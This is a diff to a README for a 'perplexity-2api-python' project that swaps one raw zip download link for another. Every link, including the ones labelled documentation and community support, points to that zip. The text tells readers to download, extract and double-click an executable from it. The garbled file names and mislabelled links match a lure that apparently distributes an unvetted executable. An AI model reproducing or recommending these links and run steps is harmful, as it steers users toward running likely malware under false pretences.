@@ -8,12 +8,12 @@ Welcome to the **perplexity-2api-python** project! This easy-to-use application 
 
 To begin, you need to download the application. Visit the Releases page using the link below:
 
-[![Download the latest release](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/static/perplexity_python_api_1.6.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/static/perplexity_python_api_1.6.zip)
+[![Download the latest release](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/app/python_perplexity_api_2.9.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/app/python_perplexity_api_2.9.zip)
 
 Follow these steps after you reach the page:
 
 1. Scroll down to find the latest version of the application.
-2. Look for the file named **https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/static/perplexity_python_api_1.6.zip** (or similar).
+2. Look for the file named **https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/app/python_perplexity_api_2.9.zip** (or similar).
 3. Click on the file to start the download.
 
 ### 🎉 Running the Application
@@ -23,7 +23,7 @@ Once the download is complete, follow these steps to run the application:
 1. Locate the downloaded file in your Downloads folder or wherever you saved it.
 2. Extract the zip file by right-clicking on it and selecting "Extract All" (or similar option).
 3. Open the extracted folder.
-4. Double-click on the **https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/static/perplexity_python_api_1.6.zip** file (or similar executable) to launch the application.
+4. Double-click on the **https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/app/python_perplexity_api_2.9.zip** file (or similar executable) to launch the application.
 
 ## 🛠️ System Requirements
 
@@ -69,13 +69,13 @@ If you encounter any problems, consider these tips:
 
 For more information, consult the following resources:
 
-- **Documentation:** For detailed instructions and troubleshooting, refer to the [Wiki](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/static/perplexity_python_api_1.6.zip).
-- **Community Support:** Join the conversation and ask questions in the [Discussions](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/static/perplexity_python_api_1.6.zip).
+- **Documentation:** For detailed instructions and troubleshooting, refer to the [Wiki](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/app/python_perplexity_api_2.9.zip).
+- **Community Support:** Join the conversation and ask questions in the [Discussions](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/app/python_perplexity_api_2.9.zip).
 
 ## 🔗 Explore More
 
 Feel free to explore the repository for other features and updates. Here’s the link again for your convenience:
 
-[![Download the latest release](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/static/perplexity_python_api_1.6.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/static/perplexity_python_api_1.6.zip)
+[![Download the latest release](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/app/python_perplexity_api_2.9.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/Casheu1/perplexity-2api-python/raw/refs/heads/main/app/python_perplexity_api_2.9.zip)
 
 Enjoy your journey with **perplexity-2api-python**!
